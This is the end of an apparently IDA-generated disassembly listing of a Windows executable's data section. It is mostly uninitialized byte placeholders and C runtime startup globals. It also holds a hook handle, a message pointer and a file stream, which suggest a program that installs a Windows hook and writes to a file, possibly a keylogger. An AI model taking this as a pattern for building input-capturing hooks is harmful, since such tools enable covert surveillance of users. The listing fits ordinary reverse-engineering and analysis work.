.data:004032F7                 db    ? ;
.data:004032F8                 db    ? ;
.data:004032F9                 db    ? ;
.data:004032FA                 db    ? ;
.data:004032FB                 db    ? ;
.data:004032FC                 db    ? ;
.data:004032FD                 db    ? ;
.data:004032FE                 db    ? ;
.data:004032FF                 db    ? ;
.data:00403300                 db    ? ;
.data:00403301                 db    ? ;
.data:00403302                 db    ? ;
.data:00403303                 db    ? ;
.data:00403304                 db    ? ;
.data:00403305                 db    ? ;
.data:00403306                 db    ? ;
.data:00403307                 db    ? ;
.data:00403308                 db    ? ;
.data:00403309                 db    ? ;
.data:0040330A                 db    ? ;
.data:0040330B                 db    ? ;
.data:0040330C                 db    ? ;
.data:0040330D                 db    ? ;
.data:0040330E                 db    ? ;
.data:0040330F                 db    ? ;
.data:00403310                 db    ? ;
.data:00403311                 db    ? ;
.data:00403312                 db    ? ;
.data:00403313                 db    ? ;
.data:00403314                 db    ? ;
.data:00403315                 db    ? ;
.data:00403316                 db    ? ;
.data:00403317                 db    ? ;
.data:00403318                 db    ? ;
.data:00403319                 db    ? ;
.data:0040331A                 db    ? ;
.data:0040331B                 db    ? ;
.data:0040331C                 db    ? ;
.data:0040331D                 db    ? ;
.data:0040331E                 db    ? ;
.data:0040331F                 db    ? ;
.data:00403320                 db    ? ;
.data:00403321                 db    ? ;
.data:00403322                 db    ? ;
.data:00403323                 db    ? ;
.data:00403324                 db    ? ;
.data:00403325                 db    ? ;
.data:00403326                 db    ? ;
.data:00403327                 db    ? ;
.data:00403328                 db    ? ;
.data:00403329                 db    ? ;
.data:0040332A                 db    ? ;
.data:0040332B                 db    ? ;
.data:0040332C                 db    ? ;
.data:0040332D                 db    ? ;
.data:0040332E                 db    ? ;
.data:0040332F                 db    ? ;
.data:00403330                 db    ? ;
.data:00403331                 db    ? ;
.data:00403332                 db    ? ;
.data:00403333                 db    ? ;
.data:00403334                 db    ? ;
.data:00403335                 db    ? ;
.data:00403336                 db    ? ;
.data:00403337                 db    ? ;
.data:00403338                 db    ? ;
.data:00403339                 db    ? ;
.data:0040333A                 db    ? ;
.data:0040333B                 db    ? ;
.data:0040333C                 db    ? ;
.data:0040333D                 db    ? ;
.data:0040333E                 db    ? ;
.data:0040333F                 db    ? ;
.data:00403340                 db    ? ;
.data:00403341                 db    ? ;
.data:00403342                 db    ? ;
.data:00403343                 db    ? ;
.data:00403344                 db    ? ;
.data:00403345                 db    ? ;
.data:00403346                 db    ? ;
.data:00403347                 db    ? ;
.data:00403348                 db    ? ;
.data:00403349                 db    ? ;
.data:0040334A                 db    ? ;
.data:0040334B                 db    ? ;
.data:0040334C                 db    ? ;
.data:0040334D                 db    ? ;
.data:0040334E                 db    ? ;
.data:0040334F                 db    ? ;
.data:00403350                 db    ? ;
.data:00403351                 db    ? ;
.data:00403352                 db    ? ;
.data:00403353                 db    ? ;
.data:00403354                 db    ? ;
.data:00403355                 db    ? ;
.data:00403356                 db    ? ;
.data:00403357                 db    ? ;
.data:00403358                 db    ? ;
.data:00403359                 db    ? ;
.data:0040335A                 db    ? ;
.data:0040335B                 db    ? ;
.data:0040335C                 db    ? ;
.data:0040335D                 db    ? ;
.data:0040335E                 db    ? ;
.data:0040335F                 db    ? ;
.data:00403360                 db    ? ;
.data:00403361                 db    ? ;
.data:00403362                 db    ? ;
.data:00403363                 db    ? ;
.data:00403364                 db    ? ;
.data:00403365                 db    ? ;
.data:00403366                 db    ? ;
.data:00403367                 db    ? ;
.data:00403368                 db    ? ;
.data:00403369                 db    ? ;
.data:0040336A                 db    ? ;
.data:0040336B                 db    ? ;
.data:0040336C                 db    ? ;
.data:0040336D                 db    ? ;
.data:0040336E                 db    ? ;
.data:0040336F                 db    ? ;
.data:00403370                 db    ? ;
.data:00403371                 db    ? ;
.data:00403372                 db    ? ;
.data:00403373                 db    ? ;
.data:00403374                 db    ? ;
.data:00403375                 db    ? ;
.data:00403376                 db    ? ;
.data:00403377                 db    ? ;
.data:00403378                 db    ? ;
.data:00403379                 db    ? ;
.data:0040337A                 db    ? ;
.data:0040337B                 db    ? ;
.data:0040337C dword_40337C    dd ?                    ; DATA XREF: __scrt_common_main_seh(void)+2D↑r
.data:0040337C                                         ; __scrt_common_main_seh(void)+41↑w ...
.data:00403380 unk_403380      db    ? ;               ; DATA XREF: ___scrt_acquire_startup_lock+10↑o
.data:00403380                                         ; ___scrt_release_startup_lock+14↑o
.data:00403381                 db    ? ;
.data:00403382                 db    ? ;
.data:00403383                 db    ? ;
.data:00403384 byte_403384     db ?                    ; DATA XREF: ___scrt_initialize_crt+9↑w
.data:00403384                                         ; ___scrt_uninitialize_crt+3↑r
.data:00403385 byte_403385     db ?                    ; DATA XREF: ___scrt_initialize_onexit_tables+3↑r
.data:00403385                                         ; ___scrt_initialize_onexit_tables:loc_40159E↑w
.data:00403386                 align 4
.data:00403388 ; _onexit_table_t Table
.data:00403388 Table           _onexit_table_t <?>     ; DATA XREF: ___scrt_initialize_onexit_tables+2A↑o
.data:00403388                                         ; ___scrt_initialize_onexit_tables+4F↑w ...
.data:00403394 ; _onexit_table_t stru_403394
.data:00403394 stru_403394     _onexit_table_t <?>     ; DATA XREF: ___scrt_initialize_onexit_tables+39↑o
.data:00403394                                         ; ___scrt_initialize_onexit_tables+61↑w ...
.data:004033A0 ; union _SLIST_HEADER ListHead
.data:004033A0 ListHead        _SLIST_HEADER <?>       ; DATA XREF: sub_401772↑o
.data:004033A8 unk_4033A8      db    ? ;               ; DATA XREF: sub_4017A5↑o
.data:004033A9                 db    ? ;
.data:004033AA                 db    ? ;
.data:004033AB                 db    ? ;
.data:004033AC                 db    ? ;
.data:004033AD                 db    ? ;
.data:004033AE                 db    ? ;
.data:004033AF                 db    ? ;
.data:004033B0 unk_4033B0      db    ? ;               ; DATA XREF: sub_4017AB↑o
.data:004033B1                 db    ? ;
.data:004033B2                 db    ? ;
.data:004033B3                 db    ? ;
.data:004033B4                 db    ? ;
.data:004033B5                 db    ? ;
.data:004033B6                 db    ? ;
.data:004033B7                 db    ? ;
.data:004033B8 dword_4033B8    dd ?                    ; DATA XREF: sub_4019A4↑w
.data:004033BC dword_4033BC    dd ?                    ; DATA XREF: sub_401A84+2EB↑w
.data:004033C0 dword_4033C0    dd ?                    ; DATA XREF: sub_401A84+3↑w
.data:004033C0                                         ; sub_401A84+17A↑w ...
.data:004033C4 dword_4033C4    dd ?                    ; DATA XREF: sub_401A84:loc_401B3F↑w
.data:004033C4                                         ; sub_401A84+10A↑w
.data:004033C8 unk_4033C8      db    ? ;               ; DATA XREF: sub_4017E0↑o
.data:004033C9                 db    ? ;
.data:004033CA                 db    ? ;
.data:004033CB                 db    ? ;
.data:004033CC unk_4033CC      db    ? ;               ; DATA XREF: sub_4017DA↑o
.data:004033CD                 db    ? ;
.data:004033CE                 db    ? ;
.data:004033CF                 db    ? ;
.data:004033D0 ; FILE *Stream
.data:004033D0 Stream          dd ?                    ; DATA XREF: fn+16↑w
.data:004033D0                                         ; fn+2E↑r
.data:004033D4 ; LPMSG lpMsg
.data:004033D4 lpMsg           dd ?                    ; DATA XREF: _main+58↑r
.data:004033D4                                         ; _main:loc_4010D2↑r ...
.data:004033D8 ; HHOOK hhk
.data:004033D8 hhk             dd ?                    ; DATA XREF: fn+46↑r
.data:004033D8                                         ; _main+2D↑w
.data:004033DC                 align 1000h
.data:004033DC _data           ends
.data:004033DC
.data:004033DC
.data:004033DC                 end start
